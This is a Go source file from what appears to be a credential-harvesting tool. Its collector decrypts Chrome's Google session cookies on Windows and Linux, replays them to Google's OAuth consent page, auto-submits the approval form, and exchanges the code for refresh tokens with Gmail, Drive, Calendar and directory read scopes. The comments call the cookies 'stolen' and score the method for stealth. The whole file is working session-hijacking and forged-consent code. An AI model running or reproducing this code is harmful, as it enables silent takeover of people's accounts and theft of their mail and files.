//go:build !darwin

package google

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"

	"github.com/ninken/ninloader-go/internal/chromium"
	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
	"github.com/ninken/ninloader-go/internal/validator"
)

const (
	httpOAuthTokenEndpoint = "https://oauth2.googleapis.com/token"
	httpOAuthAuthURL       = "https://accounts.google.com/o/oauth2/v2/auth"
	httpOAuthRedirectURI   = "http://localhost:1"
)

// Workspace scopes — same as gws_cli.
var httpOAuthDefaultScopes = strings.Join([]string{
	"openid",
	"email",
	"profile",
	"https://www.googleapis.com/auth/gmail.readonly",
	"https://www.googleapis.com/auth/drive.readonly",
	"https://www.googleapis.com/auth/calendar.readonly",
	"https://www.googleapis.com/auth/admin.directory.user.readonly",
}, " ")

// Cookie names needed for Google account session.
var sessionCookieNames = map[string]struct{}{
	"SID":               {},
	"HSID":              {},
	"SSID":              {},
	"APISID":            {},
	"SAPISID":           {},
	"__Secure-1PSID":    {},
	"__Secure-3PSID":    {},
	"__Secure-1PSIDTS":  {},
	"__Secure-3PSIDTS":  {},
	"NID":               {},
	"OSID":              {},
	"LSID":              {},
	"__Secure-1PAPISID": {},
	"__Secure-3PAPISID": {},
	"__Secure-1PSIDCC":  {},
	"__Secure-3PSIDCC":  {},
}

// Chrome user-agent for HTTP requests.
const chromeUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
	"AppleWebKit/537.36 (KHTML, like Gecko) " +
	"Chrome/131.0.0.0 Safari/537.36"

func init() {
	registry.Register("google", "http_oauth", func() collector.Collector {
		return &HttpOAuthCollector{
			BaseCollector: collector.BaseCollector{Svc: "google", Src: "http_oauth", Plats: []string{"linux", "windows"}},
		}
	})
}

// HttpOAuthCollector completes the Google OAuth consent flow entirely over HTTP
// using stolen Chrome cookies. No browser window, no CDP, no Keychain prompt.
//
// Flow:
//  1. Read client_secret.json for OAuth client_id/client_secret
//  2. Decrypt Chrome cookies for .google.com (silent on Windows/Linux)
//  3. GET the OAuth consent URL with cookies attached
//  4. Parse the consent HTML for hidden form fields (CSRF tokens, session state)
//  5. POST the consent form to approve scopes
//  6. Capture the auth code from the redirect Location header
//  7. Exchange auth code for tokens
//
// Stealth 5: no browser window, no CDP, no Keychain dialog. Pure HTTP.
type HttpOAuthCollector struct {
	collector.BaseCollector
}

func (c *HttpOAuthCollector) Service() string    { return c.Svc }
func (c *HttpOAuthCollector) Source() string      { return c.Src }
func (c *HttpOAuthCollector) StealthScore() int   { return 5 }
func (c *HttpOAuthCollector) Platforms() []string { return c.Plats }

// ── Discover ─────────────────────────────────────────────────

func (c *HttpOAuthCollector) Discover() []*types.DiscoveredToken {
	client := readClientSecret("")
	if client == nil {
		return nil
	}

	// Check Chrome profiles exist (without decrypting).
	browserDir := platform.ChromeUserDataDir()
	profiles := chromium.ListProfiles(browserDir)
	if len(profiles) == 0 {
		return nil
	}

	hint := client.ClientID
	if len(hint) > 25 {
		hint = hint[:25] + "..."
	}

	return []*types.DiscoveredToken{{
		Service:      c.Svc,
		Source:       c.Src,
		Path:         clientSecretPath(""),
		AccountHint:  fmt.Sprintf("client_id=%s", hint),
		StealthScore: c.StealthScore(),
		Details: fmt.Sprintf(
			"HTTP-only OAuth via Chrome cookies — no browser launch; profiles: %s; platform=%s",
			strings.Join(profiles, ", "), platform.Platform(),
		),
	}}
}

// ── Collect ──────────────────────────────────────────────────

func (c *HttpOAuthCollector) Collect() []*types.CollectedToken {
	// 1. Read client credentials.
	client := readClientSecret("")
	if client == nil {
		c.Warn("~/.config/gws/client_secret.json not found or invalid")
		return nil
	}

	c.Info("Starting HTTP-only OAuth flow (no browser)...")

	// 2. Get Chrome encryption key (silent on Windows/Linux).
	key, err := chromium.GetChromeKey(false)
	if err != nil {
		c.Warn(fmt.Sprintf("Cannot get Chrome key: %v", err))
		return nil
	}

	// 3. Try each Chrome profile.
	browserDir := platform.ChromeUserDataDir()
	profiles := chromium.ListProfiles(browserDir)
	if len(profiles) == 0 {
		c.Warn("No Chrome profiles found")
		return nil
	}

	for _, profile := range profiles {
		tok := c.tryProfile(profile, browserDir, key, client)
		if tok != nil {
			// One successful token is enough — avoid duplicate consent approvals.
			return []*types.CollectedToken{tok}
		}
	}

	return nil
}

// ── Per-profile flow ─────────────────────────────────────────

func (c *HttpOAuthCollector) tryProfile(profile, browserDir string, key []byte, client *clientCredentials) *types.CollectedToken {
	c.Info(fmt.Sprintf("Trying profile: %s", profile))

	// Extract Google cookies.
	cookies, err := chromium.ExtractCookies(
		browserDir, profile,
		[]string{".google.com", "accounts.google.com"},
		nil, // all cookie names
	)
	if err != nil {
		c.Warn(fmt.Sprintf("Cookie extraction failed for %s: %v", profile, err))
		return nil
	}
	if len(cookies) == 0 {
		c.Info(fmt.Sprintf("No Google cookies in %s", profile))
		return nil
	}

	// Check for session cookies (at least SID or __Secure-1PSID).
	hasSession := false
	var found []string
	for _, ck := range cookies {
		if _, ok := sessionCookieNames[ck.Name]; ok {
			found = append(found, ck.Name)
			if ck.Name == "SID" || ck.Name == "__Secure-1PSID" || ck.Name == "OSID" {
				hasSession = true
			}
		}
	}
	if !hasSession {
		c.Info(fmt.Sprintf("No session cookies in %s (have: %v)", profile, found))
		return nil
	}

	c.Info(fmt.Sprintf("Found %d Google cookies in %s (session: %v)", len(cookies), profile, found))

	// Build cookie header string.
	cookieHeader := buildCookieHeader(cookies)

	// Build OAuth URL.
	params := url.Values{
		"client_id":     {client.ClientID},
		"redirect_uri":  {httpOAuthRedirectURI},
		"response_type": {"code"},
		"scope":         {httpOAuthDefaultScopes},
		"access_type":   {"offline"},
		"prompt":        {"consent"},
	}
	authURL := httpOAuthAuthURL + "?" + params.Encode()

	// 4. GET the consent page with stolen cookies.
	c.Info("Fetching OAuth consent page with stolen cookies...")

	// Use a transport that does NOT follow redirects — we capture them.
	noRedirectClient := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	req, _ := http.NewRequest("GET", authURL, nil)
	req.Header.Set("Cookie", cookieHeader)
	req.Header.Set("User-Agent", chromeUA)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")

	// For the initial GET, follow redirects (but keep cookies).
	followClient := &http.Client{}
	followReq, _ := http.NewRequest("GET", authURL, nil)
	followReq.Header.Set("Cookie", cookieHeader)
	followReq.Header.Set("User-Agent", chromeUA)
	followReq.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")
	followReq.Header.Set("Accept-Language", "en-US,en;q=0.9")

	resp, err := followClient.Do(followReq)
	if err != nil {
		c.Warn(fmt.Sprintf("HTTP error fetching consent page: %v", err))
		return nil
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to read consent page: %v", err))
		return nil
	}
	html := string(body)
	finalURL := resp.Request.URL.String()

	// Check if we got redirected directly to auth code (already approved).
	if strings.Contains(finalURL, "code=") {
		authCode := extractAuthCodeFromURL(finalURL)
		if authCode != "" {
			c.Info("Scopes already approved — auth code captured from redirect!")
			return c.exchangeAndBuild(authCode, client, profile)
		}
	}

	// Detect consent page state.
	state := detectConsentState(html)
	c.Info(fmt.Sprintf("Consent page state: %s", state))

	switch state {
	case "login":
		c.Warn(fmt.Sprintf("Google session expired in %s — cookies are stale", profile))
		return nil

	case "error":
		c.Warn(fmt.Sprintf("Google returned an error page for %s", profile))
		return nil

	case "approved":
		authCode := extractAuthCodeFromHTML(html)
		if authCode != "" {
			c.Info("Auth code found in page (previously approved scopes)")
			return c.exchangeAndBuild(authCode, client, profile)
		}
		c.Warn("Page appears approved but could not extract auth code")
		return nil

	case "consent":
		return c.submitConsent(html, finalURL, cookieHeader, noRedirectClient, client, profile)

	default:
		// Unknown state — try form extraction anyway.
		c.Info("Unknown page state — attempting form extraction...")
		return c.submitConsent(html, finalURL, cookieHeader, noRedirectClient, client, profile)
	}
}

// ── Consent form submission ──────────────────────────────────

func (c *HttpOAuthCollector) submitConsent(
	html, pageURL, cookieHeader string,
	noRedirectClient *http.Client,
	client *clientCredentials,
	profile string,
) *types.CollectedToken {
	// Extract hidden form fields.
	fields := extractFormFields(html)
	if len(fields) == 0 {
		c.Warn(
			"Could not find hidden form fields in consent page. " +
				"This may be a new consent format or the session is invalid. " +
				"Falling back: try gws_cli collector for interactive flow.",
		)
		return nil
	}
	c.Info(fmt.Sprintf("Found %d hidden form fields: %v", len(fields), mapKeys(fields)))

	// Extract form action URL.
	actionURL := extractFormAction(html)
	if actionURL == "" {
		actionURL = "https://accounts.google.com/signin/oauth/consent"
	}
	if strings.HasPrefix(actionURL, "/") {
		actionURL = "https://accounts.google.com" + actionURL
	}

	// Add the approval button field.
	fields["submit_approve_access"] = "true"

	// Set bot detection fallback.
	if _, ok := fields["bgresponse"]; !ok {
		fields["bgresponse"] = "js_disabled"
	}

	c.Info(fmt.Sprintf("Submitting consent form to: %s", actionURL))

	// POST the consent form.
	formData := url.Values{}
	for k, v := range fields {
		formData.Set(k, v)
	}

	postReq, _ := http.NewRequest("POST", actionURL, strings.NewReader(formData.Encode()))
	postReq.Header.Set("Cookie", cookieHeader)
	postReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	postReq.Header.Set("User-Agent", chromeUA)
	postReq.Header.Set("Referer", pageURL)
	postReq.Header.Set("Origin", "https://accounts.google.com")
	postReq.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")

	// Try with no-redirect client to capture Location header.
	resp, err := noRedirectClient.Do(postReq)
	if err != nil {
		c.Warn(fmt.Sprintf("Network error submitting consent: %v", err))
		return nil
	}
	defer resp.Body.Close()

	var authCode string

	// Check redirect Location header.
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		location := resp.Header.Get("Location")
		if location != "" && strings.Contains(location, "code=") {
			authCode = extractAuthCodeFromURL(location)
		}
	}

	// Read response body for OOB code or follow-on redirect.
	if authCode == "" {
		respBody, _ := io.ReadAll(resp.Body)
		respHTML := string(respBody)

		// Check final URL.
		if resp.Request != nil && resp.Request.URL != nil {
			finalURL := resp.Request.URL.String()
			if strings.Contains(finalURL, "code=") {
				authCode = extractAuthCodeFromURL(finalURL)
			}
		}

		// Check HTML body for auth code (OOB flow).
		if authCode == "" {
			authCode = extractAuthCodeFromHTML(respHTML)
		}
	}

	// If no-redirect didn't yield a code, try following redirects.
	if authCode == "" {
		followClient := &http.Client{}
		postReq2, _ := http.NewRequest("POST", actionURL, strings.NewReader(formData.Encode()))
		postReq2.Header.Set("Cookie", cookieHeader)
		postReq2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		postReq2.Header.Set("User-Agent", chromeUA)
		postReq2.Header.Set("Referer", pageURL)
		postReq2.Header.Set("Origin", "https://accounts.google.com")
		postReq2.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")

		resp2, err := followClient.Do(postReq2)
		if err == nil {
			defer resp2.Body.Close()
			respBody2, _ := io.ReadAll(resp2.Body)
			respHTML2 := string(respBody2)
			finalURL2 := ""
			if resp2.Request != nil && resp2.Request.URL != nil {
				finalURL2 = resp2.Request.URL.String()
			}
			if strings.Contains(finalURL2, "code=") {
				authCode = extractAuthCodeFromURL(finalURL2)
			}
			if authCode == "" {
				authCode = extractAuthCodeFromHTML(respHTML2)
			}
		}
	}

	if authCode == "" {
		c.Warn(
			"Consent form submitted but no auth code received. " +
				"Possible causes: new scopes never previously approved, " +
				"CAPTCHA challenge, or changed consent flow format. " +
				"Use gws_cli collector for interactive browser flow.",
		)
		return nil
	}

	c.Info("Auth code captured from consent form submission!")
	return c.exchangeAndBuild(authCode, client, profile)
}

// ── Token exchange ───────────────────────────────────────────

func (c *HttpOAuthCollector) exchangeAndBuild(authCode string, client *clientCredentials, profile string) *types.CollectedToken {
	c.Info("Exchanging auth code for tokens...")

	tokenURI := httpOAuthTokenEndpoint
	if client.TokenURI != "" {
		tokenURI = client.TokenURI
	}

	tokenData, err := exchangeCode(authCode, client, httpOAuthRedirectURI, tokenURI)
	if err != nil {
		c.Warn(fmt.Sprintf("Token exchange failed: %v", err))
		return nil
	}

	// Decode email from id_token JWT.
	var email string
	if idToken, ok := tokenData["id_token"].(string); ok && idToken != "" {
		if payload := validator.DecodeJWTPayload(idToken); payload != nil {
			if e, ok := payload["email"].(string); ok {
				email = e
			}
		}
	}

	accessToken, _ := tokenData["access_token"].(string)
	refreshToken, _ := tokenData["refresh_token"].(string)
	scopeStr, _ := tokenData["scope"].(string)

	tok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())
	tok.AccountID = email
	tok.Username = email
	tok.AccessToken = types.Secure(accessToken)
	tok.RefreshToken = types.Secure(refreshToken)
	tok.ClientID = client.ClientID
	tok.ClientSecret = types.Secure(client.ClientSecret)
	tok.TokenURI = tokenURI
	tok.Scopes = strings.Fields(scopeStr)
	tok.Extra["grant_type"] = "authorization_code"
	tok.Extra["flow"] = "http_oauth"
	tok.Extra["profile"] = profile
	tok.Extra["no_browser"] = true
	tok.Extra["gws_cli"] = true

	c.Info(fmt.Sprintf(
		"SUCCESS — HTTP-only OAuth token for %s (profile: %s, no browser launched)",
		orUnknown(email), profile,
	))
	return tok
}

// ── HTML parsing helpers ─────────────────────────────────────

// Regex patterns for parsing Google consent page HTML.
var (
	// Form action URL.
	reFormAction = regexp.MustCompile(`(?i)<form[^>]*\baction="([^"]*)"[^>]*>`)

	// Hidden input fields — multiple ordering patterns.
	reHiddenInputs = []*regexp.Regexp{
		// type="hidden" name="X" value="Y"
		regexp.MustCompile(`(?is)<input[^>]*\btype=["']hidden["'][^>]*\bname=["']([^"']+)["'][^>]*\bvalue=["']([^"']*)["'][^>]*>`),
		// name="X" value="Y" type="hidden"
		regexp.MustCompile(`(?is)<input[^>]*\bname=["']([^"']+)["'][^>]*\bvalue=["']([^"']*)["'][^>]*\btype=["']hidden["'][^>]*>`),
		// name="X" type="hidden" value="Y"
		regexp.MustCompile(`(?is)<input[^>]*\bname=["']([^"']+)["'][^>]*\btype=["']hidden["'][^>]*\bvalue=["']([^"']*)["'][^>]*>`),
	}
	// Reverse order: value="Y" type="hidden" name="X"
	reHiddenInputReverse = regexp.MustCompile(`(?is)<input[^>]*\bvalue=["']([^"']*)["'][^>]*\btype=["']hidden["'][^>]*\bname=["']([^"']+)["'][^>]*>`)

	// Auth code extraction from HTML (OOB flow).
	reTextareaCode = regexp.MustCompile(`(?i)<textarea[^>]*\bid=["']code["'][^>]*>([^<]+)</textarea>`)
	reInputCode    = regexp.MustCompile(`(?i)<input[^>]*\bid=["']code["'][^>]*\bvalue=["']([^"']+)["']`)
	reTitleCode    = regexp.MustCompile(`(?i)<title>[^<]*code=([^<&\s]+)`)
	reSuccessCode  = regexp.MustCompile(`(?i)Success\s+code=([A-Za-z0-9/_\-]+)`)
	reGenericCode  = regexp.MustCompile(`["'>](4/[A-Za-z0-9_\-]{20,})["']`)
)

// extractFormFields extracts all hidden input fields from HTML.
func extractFormFields(html string) map[string]string {
	fields := make(map[string]string)

	// Standard ordering patterns (name, value).
	for _, re := range reHiddenInputs {
		for _, match := range re.FindAllStringSubmatch(html, -1) {
			fields[match[1]] = match[2]
		}
	}

	// Reverse order (value, name).
	for _, match := range reHiddenInputReverse.FindAllStringSubmatch(html, -1) {
		fields[match[2]] = match[1]
	}

	return fields
}

// extractFormAction extracts the form action URL from HTML.
func extractFormAction(html string) string {
	match := reFormAction.FindStringSubmatch(html)
	if match == nil {
		return ""
	}
	action := match[1]
	action = strings.ReplaceAll(action, "&amp;", "&")
	return action
}

// extractAuthCodeFromURL extracts the authorization code from a redirect URL.
func extractAuthCodeFromURL(rawURL string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}

	// Check query params.
	if code := parsed.Query().Get("code"); code != "" {
		return code
	}

	// Check fragment (hash).
	fragParams, _ := url.ParseQuery(parsed.Fragment)
	if code := fragParams.Get("code"); code != "" {
		return code
	}

	return ""
}

// extractAuthCodeFromHTML extracts the auth code from the OOB success page HTML.
func extractAuthCodeFromHTML(html string) string {
	// textarea with id="code"
	if m := reTextareaCode.FindStringSubmatch(html); m != nil {
		return strings.TrimSpace(m[1])
	}
	// input with id="code"
	if m := reInputCode.FindStringSubmatch(html); m != nil {
		return strings.TrimSpace(m[1])
	}
	// title containing "code="
	if m := reTitleCode.FindStringSubmatch(html); m != nil {
		return strings.TrimSpace(m[1])
	}
	// "Success code=" pattern
	if m := reSuccessCode.FindStringSubmatch(html); m != nil {
		return strings.TrimSpace(m[1])
	}
	// Generic 4/ prefix auth codes (Google format)
	if m := reGenericCode.FindStringSubmatch(html); m != nil {
		return strings.TrimSpace(m[1])
	}
	return ""
}

// detectConsentState detects the state of the consent page HTML.
func detectConsentState(html string) string {
	lower := strings.ToLower(html)

	// Login page (not authenticated).
	if strings.Contains(lower, "identifier") && strings.Contains(lower, `type="email"`) {
		return "login"
	}
	if strings.Contains(lower, "sign in") && strings.Contains(lower, "email or phone") {
		return "login"
	}

	// Error page.
	if strings.Contains(lower, "error") && strings.Contains(lower, "access_denied") {
		return "error"
	}
	if strings.Contains(lower, "that's an error") {
		return "error"
	}

	// Consent/approval page.
	if strings.Contains(html, "submit_approve_access") || strings.Contains(lower, "approve") {
		return "consent"
	}
	if strings.Contains(lower, "consent") && (strings.Contains(lower, "allow") || strings.Contains(lower, "grant")) {
		return "consent"
	}

	// Already approved (auth code in page).
	if strings.Contains(html, "4/") || strings.Contains(lower, "code=") {
		return "approved"
	}

	return "unknown"
}

// buildCookieHeader builds a Cookie header string from decrypted Chrome cookies.
func buildCookieHeader(cookies []chromium.Cookie) string {
	var parts []string
	for _, ck := range cookies {
		if ck.Value != "" {
			parts = append(parts, fmt.Sprintf("%s=%s", ck.Name, ck.Value))
		}
	}
	return strings.Join(parts, "; ")
}

// mapKeys returns the keys of a map for logging.
func mapKeys(m map[string]string) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}
